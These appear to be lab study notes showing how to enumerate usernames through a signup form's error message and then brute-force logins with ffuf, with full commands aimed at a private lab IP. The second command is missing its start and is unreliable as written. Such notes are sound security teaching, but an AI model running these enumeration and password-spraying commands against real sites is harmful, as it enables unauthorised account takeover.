---
---
**username enumeration**

* you can use the application ffuf - https://github.com/ffuf/ffuf  - to enumerate possible login names for a given site
* the following command will look at a given website and see which common usernames match
	* a common response when making a new account with a username that already exists is the error **an account with this username already exists** - we can thus test to see which usernames are taken
	* ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <http://10.10.203.22/customers/signup> -mr "username already exists"
		*   -w argument selects the file location of the list of usernames we're going to check
		* \-x argument specifies the request method used; by default a GET request but here is a POST request
		* \-d argument specifies the data we are going to send
		* \-H is used to add additional headers to the request
			\-u argument specifies the URL we're making a request to
			
		* \-mr argument is whatever text on the page we're looking for to validate we've found a valid username
		* **while there is a -o argument to place all the above output into a text file all you need to record are the individual names, not the whole output**

**Brute force**

* the output we put in our valid\_usernames.txt file can now be plugged into the below series of commands to see which ones are valid, **but this will only work if the valid\_usernames.txt file contains just the individual names**
* valid\_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://COMPUTER.IP.ADDRESS/customers/login -fc 200
